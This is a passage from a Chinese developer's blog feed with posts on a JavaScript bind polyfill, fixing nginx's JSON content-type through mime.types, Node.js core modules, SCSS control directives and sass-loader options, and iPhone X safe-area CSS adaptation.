<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myBind = <span class="function"><span class="keyword">function</span> (<span class="params">context</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 首先判断是不是函数调用该方法，如果不是，则抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span> !== <span class="string">"function"</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">'Error'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> me = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 去掉第一个函数参数</span></span><br><span class="line">    <span class="keyword">var</span> args = [...arguments].slice(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// var args = Array.prototype.slice(arguments, 1);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 把后面的执行函数的参数拼接到bing参数后</span></span><br><span class="line">        <span class="keyword">return</span> me.apply(context, args.concat(...arguments);</span><br><span class="line">        <span class="comment">// return me.apply(context, args.concat(Array.prototype.slice(arguments));</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx服务器返回json文件时content-type不正确的坑</title>
    <url>/2017/10/nginx%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%94%E5%9B%9Ejson%E6%96%87%E4%BB%B6%E6%97%B6contentType%E4%B8%8D%E6%AD%A3%E7%A1%AE%E7%9A%84%E5%9D%91.html</url>
    <content><![CDATA[<p>最近在用vue写个demo时，使用vue-resource 的<code>$htpp.get()</code>请求一个json文件时，webstrom本地环境可以获取到，http响应报文包头中content-type为application/json，通过<code>$http.get().then(res =&gt; {})</code>回调函数中的<code>res.body.result</code>即可获取json文件的内容，但是在上传我的云服务器后请求返回的是<code>content-type:application/octet-stream</code>：</p>
<p><img src="http://static.simmzl.cn/blog/171030/egaFgGGDb1.png" alt="mark"></p>
<p>即返回的是一个二进制流的文件，在下载文件时会用到这个类型，但是<code>res.body.result</code>就获取不到内容了。</p>
<a id="more"></a>
<h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><blockquote>
<p>在百度搜索相关问题几乎没有,在前端群里没人知道…算是遇到了个奇葩的问题…</p>
</blockquote>
<p>首先想到的是在发送get请求时设置http请求报文包头中的content-type=application/json：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Vue.http.options.headers = &#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>:<span class="string">'application/json'</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>但是这只是设置报文发送的格式，并没有设置客户端希望服务器返回的内容格式，于是继续设置Accept：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Vue.http.options.headers = &#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>:<span class="string">'application/json'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>:<span class="string">'application/json'</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>测试还是不行，响应报文中<code>content-type</code>依旧是<code>application/octet-stream</code>，很苦恼…</p>
<h3 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h3><p>在鼓捣半天确认前端没有错误后，我觉得问题应该出在服务器上。我的服务器centos是基于nginx，于是开始搜索关于nginx不返回json格式内容的问题。得到要在server中配置location拦截：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">location ~ ^/get_json &#123;</span><br><span class="line">    default_type application/json;</span><br><span class="line">    return 200 '&#123;"status":"success","result":"nginx json"&#125;';</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个配置要在nginx.conf中配置（我的配置文件还有个nginx.conf.default，两个都要配置），如果不知道nginx.conf文件在哪，可以使用搜索命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / | grep nginx.conf</span><br></pre></td></tr></table></figure>
<p>location 具体在文件哪里配置，参考<a href="http://outofmemory.cn/code-snippet/2171/nginx-peizhiwenjian-nginx-conf-xiangxi-explain" target="_blank" rel="noopener">nginx配置文件nginx.conf详细解释</a><br>配置文件修改之后要重新运行配置文件，不过要进入/nginx/sbin中执行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./nginx -s reload</span><br></pre></td></tr></table></figure>
<p>测试一下还是不行…</p>
<p>最后在stackoverflow上看到了一个问题：<a href="https://stackoverflow.com/questions/25021339/enabling-content-type-application-json-for-all-the-json-files-in-nginx" target="_blank" rel="noopener">Enabling content-type application/json for all the json files in nginx</a>，即nginx中没有设置json文件的content-type为application/json！<br>于是，找到和nginx.conf同在一个文件夹conf下的mime.types文件和mime.types.default，修改。</p>
<p><img src="http://static.simmzl.cn/blog/171030/6IKE3Gjd84.png" alt="mark"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi mime.types</span><br><span class="line">vi mime.types.default</span><br></pre></td></tr></table></figure>
<p>加上：<code>application/json           json;</code></p>
<p>效果图：</p>
<p><img src="http://static.simmzl.cn/blog/171030/86KhHhD75E.png" alt="mark"></p>
<p>然后重启配置文件，进入/nginx/sbin中执行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./nginx -s reload</span><br></pre></td></tr></table></figure>
<p>问题解决！</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>为什么nginx的默认配置里面没有application/json呢…不科学…<br>如果你遇到同样的问题，我的建议是先查看mime.types里面有没有application/json的配置，没有就加上，然后测试。无效的话就在nginx.conf中加入location的配置，在js中为get方法配置content-type和accept，就可以了。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Q&amp;A</tag>
        <tag>centos</tag>
      </tags>
  </entry>
  <entry>
    <title>nodejs-begining</title>
    <url>/2018/03/nodejs-begining.html</url>
    <content><![CDATA[<p>使用node做中间层，服务端渲染的需求，开始学习node.js<br><a id="more"></a></p>
<h1 id="node的全局环境"><a href="#node的全局环境" class="headerlink" title="node的全局环境"></a>node的全局环境</h1><p>global,process,与浏览器window，document类似。</p>
<h1 id="common-js规范"><a href="#common-js规范" class="headerlink" title="common.js规范"></a>common.js规范</h1><p>暴露对象可以使用：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">exports.name = name;</span><br></pre></td></tr></table></figure>
<p>or</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = name;</span><br></pre></td></tr></table></figure>
<h1 id="node-模块"><a href="#node-模块" class="headerlink" title="node 模块"></a>node 模块</h1><p>分为很多模块，使用模块都需要单独引入：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="built_in">require</span>(<span class="string">"moduleName"</span>);</span><br></pre></td></tr></table></figure>
<h2 id="url-API"><a href="#url-API" class="headerlink" title="url API"></a>url API</h2><p>用于网络请求参数处理等需求。</p>
<h3 id="url-parse-urlString-parseQueryString-slashesDenoteHost"><a href="#url-parse-urlString-parseQueryString-slashesDenoteHost" class="headerlink" title="url.parse(urlString[, parseQueryString[, slashesDenoteHost]])"></a>url.parse(urlString[, parseQueryString[, slashesDenoteHost]])</h3><ul>
<li>将<code>urlString</code>解析为<code>urlObj</code>。</li>
<li><code>parseQueryString</code>默认<code>false</code>，将query解析为字符串：<code>query=string</code></li>
<li><code>parseQueryString</code>为<code>true</code>时，将query解析为对象：<code>query: { query: &#39;string&#39; }</code>;</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">url.parse(<span class="string">"https://user:pass@sub.host.com:8080/p/a/t/h?query=string#hash"</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="comment">// =&gt;</span></span><br><span class="line">Url &#123;</span><br><span class="line">  protocol: <span class="string">'https:'</span>,</span><br><span class="line">  slashes: <span class="literal">true</span>,</span><br><span class="line">  auth: <span class="string">'user:pass'</span>,</span><br><span class="line">  host: <span class="string">'sub.host.com:8080'</span>,</span><br><span class="line">  port: <span class="string">'8080'</span>,</span><br><span class="line">  hostname: <span class="string">'sub.host.com'</span>,</span><br><span class="line">  hash: <span class="string">'#hash'</span>,</span><br><span class="line">  search: <span class="string">'?query=string'</span>,</span><br><span class="line">  query: &#123; <span class="attr">query</span>: <span class="string">'string'</span> &#125;,</span><br><span class="line">  pathname: <span class="string">'/p/a/t/h'</span>,</span><br><span class="line">  path: <span class="string">'/p/a/t/h?query=string'</span>,</span><br><span class="line">  href: <span class="string">'https://user:pass@sub.host.com:8080/p/a/t/h?query=string#hash'</span> &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>slashesDenoteHost</code>（斜杠表示HOST），默认为<code>false</code>,如果为<code>urlString</code>不带协议头，如<code>//simmzl.cn/movie?query=simmzl#hash</code>,则解析不出<code>host</code>为<code>simmzl.cn</code>,为<code>true</code>则可以。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">url.parse(<span class="string">"//simmzl.cn/music/?query=simmzl#hash"</span>,<span class="literal">true</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="comment">// =&gt;</span></span><br><span class="line">Url &#123;</span><br><span class="line">  protocol: <span class="literal">null</span>,</span><br><span class="line">  slashes: <span class="literal">null</span>,</span><br><span class="line">  auth: <span class="literal">null</span>,</span><br><span class="line">  host: <span class="literal">null</span>,</span><br><span class="line">  port: <span class="literal">null</span>,</span><br><span class="line">  hostname: <span class="literal">null</span>,</span><br><span class="line">  hash: <span class="string">'#hash'</span>,</span><br><span class="line">  search: <span class="string">'?query=simmzl'</span>,</span><br><span class="line">  query: &#123; <span class="attr">query</span>: <span class="string">'simmzl'</span> &#125;,</span><br><span class="line">  <span class="comment">// 将主机当作了路径名</span></span><br><span class="line">  pathname: <span class="string">'//simmzl.cn/music/'</span>,</span><br><span class="line">  path: <span class="string">'//simmzl.cn/music/?query=simmzl'</span>,</span><br><span class="line">  href: <span class="string">'//simmzl.cn/music/?query=simmzl#hash'</span> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="url-format-urlObj"><a href="#url-format-urlObj" class="headerlink" title="url.format(urlObj)"></a>url.format(urlObj)</h3><p>将<code>url对象</code>格式化为<code>url字符串</code>,与<code>parse()</code>相反；</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">url.format(&#123;</span><br><span class="line">    protocol: <span class="string">'https:'</span>,</span><br><span class="line">  slashes: <span class="literal">true</span>,</span><br><span class="line">  auth: <span class="string">'user:pass'</span>,</span><br><span class="line">  host: <span class="string">'sub.host.com:8080'</span>,</span><br><span class="line">  port: <span class="string">'8080'</span>,</span><br><span class="line">  hostname: <span class="string">'sub.host.com'</span>,</span><br><span class="line">  hash: <span class="string">'#hash'</span>,</span><br><span class="line">  search: <span class="string">'?query=string'</span>,</span><br><span class="line">  query: &#123; <span class="attr">query</span>: <span class="string">'string'</span> &#125;,</span><br><span class="line">  pathname: <span class="string">'/p/a/t/h'</span>,</span><br><span class="line">  path: <span class="string">'/p/a/t/h?query=string'</span>,</span><br><span class="line">  href: <span class="string">'https://user:pass@sub.host.com:8080/p/a/t/h?query=string#hash'</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// =&gt;</span></span><br><span class="line"><span class="string">"https://user:pass@sub.host.com:8080/p/a/t/h?query=string#hash"</span></span><br></pre></td></tr></table></figure>
<h3 id="url-reslove-from-to"><a href="#url-reslove-from-to" class="headerlink" title="url.reslove(from to)"></a>url.reslove(from to)</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line">url.resolve(<span class="string">'/one/two/three'</span>, <span class="string">'four'</span>);         <span class="comment">// '/one/two/four'</span></span><br><span class="line">url.resolve(<span class="string">'http://example.com/'</span>, <span class="string">'/one'</span>);    <span class="comment">// 'http://example.com/one'</span></span><br><span class="line">url.resolve(<span class="string">'http://example.com/one/three'</span>, <span class="string">'/two'</span>); <span class="comment">// 'http://example.com/two'</span></span><br></pre></td></tr></table></figure>
<h2 id="querystring-API"><a href="#querystring-API" class="headerlink" title="querystring API"></a>querystring API</h2><blockquote>
<p><a href="http://nodejs.cn/api/querystring.html" target="_blank" rel="noopener">文档</a></p>
</blockquote>
<p>用于解析与格式化 URL 查询字符串</p>
<h3 id="querystring-stringify-obj-sep-eq-options"><a href="#querystring-stringify-obj-sep-eq-options" class="headerlink" title="querystring.stringify(obj[, sep[, eq[, options]]])"></a>querystring.stringify(obj[, sep[, eq[, options]]])</h3><p>将对象序列化为字符串</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 默认</span></span><br><span class="line">querystring.stringify(&#123; <span class="attr">name</span>: <span class="string">'simmzl'</span>, <span class="attr">foo</span>: <span class="string">"foo"</span>, <span class="attr">bar</span>: <span class="string">"bar"</span> &#125;);</span><br><span class="line"><span class="comment">// 'name=simmzl&amp;foo=foo&amp;bar=bar'</span></span><br><span class="line"></span><br><span class="line">querystring.stringify(&#123; <span class="attr">name</span>: <span class="string">'simmzl'</span>, <span class="attr">foo</span>: <span class="string">"foo"</span>, <span class="attr">bar</span>: <span class="string">"bar"</span> &#125;, <span class="string">","</span>);</span><br><span class="line"><span class="comment">// 'name=simmzl,foo=foo,bar=bar'</span></span><br><span class="line"></span><br><span class="line">querystring.stringify(&#123; <span class="attr">name</span>: <span class="string">'simmzl'</span>, <span class="attr">foo</span>: <span class="string">"foo"</span>, <span class="attr">bar</span>: <span class="string">"bar"</span> &#125;, <span class="string">","</span>, <span class="string">":"</span>);</span><br><span class="line"><span class="comment">// 'name:simmzl,foo:foo,bar:bar'</span></span><br></pre></td></tr></table></figure>
<h3 id="querystring-parse-str-sep-eq-options"><a href="#querystring-parse-str-sep-eq-options" class="headerlink" title="querystring.parse(str[, sep[, eq[, options]]])"></a>querystring.parse(str[, sep[, eq[, options]]])</h3><p>将字符串反序列化为对象</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">querystring.parse(<span class="string">"name=simmzl&amp;foo=foo&amp;bar=bar&amp;arr=tom&amp;arr=jerry"</span>)</span><br><span class="line"><span class="comment">// &#123; name: 'simmzl',</span></span><br><span class="line"><span class="comment">//   foo: 'foo',</span></span><br><span class="line"><span class="comment">//   bar: 'bar',</span></span><br><span class="line"><span class="comment">//   arr: [ 'tom', 'jerry' ] &#125;</span></span><br><span class="line"></span><br><span class="line">querystring.parse(<span class="string">'name:simmzl,foo:foo,bar:bar'</span>, <span class="string">','</span>, <span class="string">':'</span>)</span><br><span class="line"><span class="comment">// &#123; name: 'simmzl', foo: 'foo', bar: 'bar' &#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="querystring-escape-str-amp-amp-querystring-unescape-str"><a href="#querystring-escape-str-amp-amp-querystring-unescape-str" class="headerlink" title="querystring.escape(str) &amp;&amp; ### querystring.unescape(str)"></a>querystring.escape(str) &amp;&amp; ### querystring.unescape(str)</h3><p>转义字符与反转义  </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">querystring.escape(<span class="string">'&lt;哈哈&gt;'</span>);</span><br><span class="line"><span class="comment">// '%3C%E5%93%88%E5%93%88%3E'</span></span><br><span class="line"></span><br><span class="line">querystring.unescape(<span class="string">'%3C%E5%93%88%E5%93%88%3E'</span>);</span><br><span class="line"><span class="comment">// '&lt;哈哈&gt;'</span></span><br></pre></td></tr></table></figure>
<h2 id="events"><a href="#events" class="headerlink" title="events"></a>events</h2><p>像JavaScript一样事件的驱动</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入events模块</span></span><br><span class="line"><span class="keyword">const</span> EventEmitter = <span class="built_in">require</span>(<span class="string">'events'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyEmitter</span> <span class="keyword">extends</span> <span class="title">EventEmitter</span> </span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> myEmitter = <span class="keyword">new</span> MyEmitter();</span><br><span class="line"><span class="comment">// eventEmitter.on(eventName，listener)注册监听器，同eventEmitter.addEventLister()，皆可。</span></span><br><span class="line"><span class="comment">// 如果事件有监听器，则返回 true ，否则返回 false。</span></span><br><span class="line">myEmitter.on(<span class="string">'myEvent'</span>, param =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`触发了第一个事件！<span class="subst">$&#123;param&#125;</span>`</span>);</span><br><span class="line"><span class="comment">// this指向&#123;&#125;</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 setImmediate() 或 process.nextTick() 方法切换到异步操作模式</span></span><br><span class="line">myEmitter.on(<span class="string">'myEvent'</span>, param =&gt; &#123;</span><br><span class="line">  setImmediate(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'这个是异步发生的'</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">myEmitter.on(<span class="string">'myEvent'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">param</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`触发了第二个事件！<span class="subst">$&#123;param&#125;</span>`</span>);</span><br><span class="line">  <span class="comment">// this指向myEmitter</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// eventEmitter.emit(eventName[, ...args]) 方法用于触发事件</span></span><br><span class="line">myEmitter.emit(<span class="string">'myEvent'</span>, <span class="string">'test'</span>);</span><br></pre></td></tr></table></figure>
<h2 id="readline"><a href="#readline" class="headerlink" title="readline"></a>readline</h2><p>逐行读取数据</p>
<h3 id="readline-createInterface-options"><a href="#readline-createInterface-options" class="headerlink" title="readline.createInterface(options)"></a>readline.createInterface(options)</h3><p>创建一个<code>interface</code>类</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> rl = readline.createInterface(&#123;</span><br><span class="line">  input: process.stdin,</span><br><span class="line">  output: process.stdout</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="line事件"><a href="#line事件" class="headerlink" title="line事件"></a>line事件</h3><p>每当<code>input</code>流接收到接收行结束符（\n、\r 或 \r\n）时触发 <code>line</code> 事件,监听器函数被调用时会带上一个包含接收的那一行输入的字符串作为参数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 每回车一次执行一次</span></span><br><span class="line">rl.on(<span class="string">'line'</span>, line =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`接收到了<span class="subst">$&#123;line&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>node</tag>
      </tags>
  </entry>
  <entry>
    <title>About SCSS</title>
    <url>/2019/09/scss.html</url>
    <content><![CDATA[<p>Something about scss.</p>
<a id="more"></a>
<h2 id="语法格式-Syntax"><a href="#语法格式-Syntax" class="headerlink" title="语法格式 (Syntax)"></a>语法格式 (Syntax)</h2><p>Sass 有两种语法格式。</p>
<ul>
<li><p>SCSS (Sassy CSS) 这种格式仅在 CSS3 语法的基础上进行拓展，所有 CSS3 语法在 SCSS 中都是通用的，同时加入 Sass 的特色功能。此外，SCSS 也支持大多数 CSS hacks 写法以及浏览器前缀写法 (vendor-specific syntax)，以及早期的 IE 滤镜写法。文件名为 <strong>.scss</strong>。</p>
</li>
<li><p>最早的 Sass 语法格式，被称为缩进格式 (Indented Sass) 简称 “Sass”，是一种简化格式。它<strong>使用 “缩进” 代替 “花括号” 表示属性属于某个选择器，用 “换行” 代替 “分号” 分隔属性</strong>，很多人认为这样做比 SCSS 更容易阅读，书写也更快速。缩进格式也可以使用 Sass 的全部功能，只是与 SCSS 相比个别地方采取了不同的表达方式，文件名为 <strong>.scss</strong>。</p>
</li>
</ul>
<h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><h3 id="if-else"><a href="#if-else" class="headerlink" title="@if @else"></a>@if @else</h3><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$boolean</span>: true !default;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">@mixin</span> simple-mixin &#123;</span><br><span class="line">  <span class="keyword">@if</span> <span class="variable">$boolean</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">@else</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="selector-class">.some-selector</span> &#123;</span><br><span class="line">  <span class="keyword">@include</span> simple-mixin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><h3 id="for"><a href="#for" class="headerlink" title="@for"></a>@for</h3><p>同for循环</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 0、1、2、3</span></span><br><span class="line"><span class="keyword">@for</span> <span class="variable">$i</span> from <span class="number">0</span> through <span class="number">3</span> &#123;</span><br><span class="line">  <span class="selector-class">.test-</span>#&#123;<span class="variable">$i</span>&#125; &#123;</span><br><span class="line">    <span class="attribute">animation</span>: bounce-in .<span class="number">5s</span> ease-in-out #&#123;<span class="variable">$i</span> * .<span class="number">1</span>&#125;s;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.temp-</span>#&#123;<span class="variable">$i</span>&#125; &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span> * <span class="variable">$i</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0、1、2</span></span><br><span class="line"><span class="keyword">@for</span> <span class="variable">$i</span> from <span class="number">0</span> to <span class="number">3</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="each"><a href="#each" class="headerlink" title="@each"></a>@each</h3><p>用于循环数组:</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@each</span> <span class="variable">$var</span> in &lt;list&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$list</span>: adam john wynn mason kuroir;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">@mixin</span> author-images &#123;</span><br><span class="line">  <span class="keyword">@each</span> <span class="variable">$author</span> in <span class="variable">$list</span> &#123;</span><br><span class="line">    <span class="selector-class">.photo-</span>#&#123;<span class="variable">$author</span>&#125; &#123;</span><br><span class="line">        <span class="attribute">background</span>: url(<span class="string">"/images/avatars/#&#123;$author&#125;.png"</span>) no-repeat;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.author-bio</span> &#123;</span><br><span class="line">  <span class="keyword">@include</span> author-images;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="while"><a href="#while" class="headerlink" title="@while"></a>@while</h3><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$types</span>: <span class="number">4</span>;</span><br><span class="line"><span class="variable">$type-width</span>: <span class="number">20px</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">@while</span> <span class="variable">$types</span> &gt; <span class="number">0</span> &#123;</span><br><span class="line">  <span class="selector-class">.while-</span>#&#123;<span class="variable">$types</span>&#125; &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="variable">$type-width</span> + <span class="variable">$types</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$types</span>: <span class="variable">$types</span> - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="sass-loader"><a href="#sass-loader" class="headerlink" title="sass-loader"></a>sass-loader</h3><h4 id="scss文件"><a href="#scss文件" class="headerlink" title="scss文件"></a>scss文件</h4><p>在webpack中处理scss文件需要配置sass-loader：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  loader: <span class="string">'sass-loader'</span>,</span><br><span class="line">  options: &#123;</span><br><span class="line">    outputStyle: <span class="string">'expanded'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>outputStyle为scss转css时的输出格式，具体解释可看：<a href="https://www.sass.hk/docs/" target="_blank" rel="noopener">sass文档</a></p>
<p>如果不配置该项，sass-loader会默认<code>outputStyle=&quot;compressed&quot;</code>：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sass-loader/lib/normalizeOptions.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// opt.outputStyle</span></span><br><span class="line"><span class="keyword">if</span> (!options.outputStyle &amp;&amp; loaderContext.minimize) &#123;</span><br><span class="line">  options.outputStyle = <span class="string">"compressed"</span>; <span class="comment">// 压缩</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这会导致一个<strong>问题</strong>，在使用px2rem时，有时会使用 <code>/*px*/</code> <code>/*no*/</code>这样的注释，<code>outputStyle = &quot;compressed&quot;</code>压缩会删除注释。<br>因此配置<code>outputStyle: &#39;expanded&#39;</code>可以解决这个问题。相关的blog有<a href="https://github.com/neilgao000/blog/issues/15" target="_blank" rel="noopener">webpack 中 postcss-px2rem 生产环境中注释失效</a>。<br>sass-loader就让它只负责转scss文件，压缩的事情就交给webpack其他专业的压缩工具。</p>
<h4 id="sass文件"><a href="#sass文件" class="headerlink" title="sass文件"></a>sass文件</h4><p>另外，在处理<code>.sass</code>文件时，需配置<code>indentedSyntax: true</code>，声明处理的是<code>sass文件</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  loader: <span class="string">'sass-loader'</span>,</span><br><span class="line">  options: &#123;</span><br><span class="line">    indentedSyntax: <span class="literal">true</span>,</span><br><span class="line">    outputStyle: <span class="string">'expanded'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>scss</tag>
      </tags>
  </entry>
  <entry>
    <title>iphonex系列css适配</title>
    <url>/2019/09/iphonex%E7%B3%BB%E5%88%97css%E9%80%82%E9%85%8D.html</url>
    <content><![CDATA[<p>在hybrid中，会遇到native把全屏交给webview的情况，在iphone刘海屏手机上就需要做刘海屏、底部小黑条适配了</p>
<p><img src="https://static.simmzl.cn/11.jpg" alt></p>
<a id="more"></a>
<h2 id="safe-area-安全区域"><a href="#safe-area-安全区域" class="headerlink" title="safe area / 安全区域"></a>safe area / 安全区域</h2><p>iphonex之后引入的新概念，安全区域指的是一个可视窗口范围，处于安全区域的内容不受圆角（corners）、齐刘海（sensor housing）、小黑条（Home Indicator）影响，如下图所示：</p>
<p><img src="https://static.simmzl.cn/20190912170510.jpg" alt="img"></p>
<h2 id="viewport-fit"><a href="#viewport-fit" class="headerlink" title="viewport-fit"></a>viewport-fit</h2><p>iOS11 新增特性，苹果公司为了适配 iPhoneX等刘海屏， 对现有 viewport meta 标签的一个扩展，用于设置网页在可视窗口的布局方式，可设置 三个值：</p>
<ul>
<li>auto 默认</li>
<li>contain 可视窗口完全<strong>包含</strong>网页内容，左图</li>
<li>cover 网页内容完全<strong>覆盖</strong>可视窗口，即页面完全充满屏幕，右图。<strong>适配关键！</strong></li>
</ul>
<p><img src="https://static.simmzl.cn/20190912161522.jpg" alt="img"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"viewport-fit=cover"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="constant-safe-area-inset-函数"><a href="#constant-safe-area-inset-函数" class="headerlink" title="constant(safe-area-inset-*)函数"></a>constant(safe-area-inset-*)函数</h2><p>iOS11 新增特性，Webkit 的一个 CSS 函数，用于设获取安全区域与边界的距离，有四个预定义的变量（单位是px）：</p>
<ul>
<li>safe-area-inset-left：安全区域距离左边界距离，<strong>横屏时适配</strong></li>
<li>safe-area-inset-right：安全区域距离右边界距离，<strong>横屏时适配</strong></li>
<li>safe-area-inset-top：安全区域距离顶部边界距离， <strong>竖屏刘海适配关键</strong></li>
<li>safe-area-inset-bottom：安全区域距离底部边界距离，<strong>竖屏小黑条适配关键</strong></li>
</ul>
<p>适配的核心是：<strong>通过 constant() 可以获取到非安全边距，再结合 padding 或 margin 来控制页面元素避开非安全区域。</strong></p>
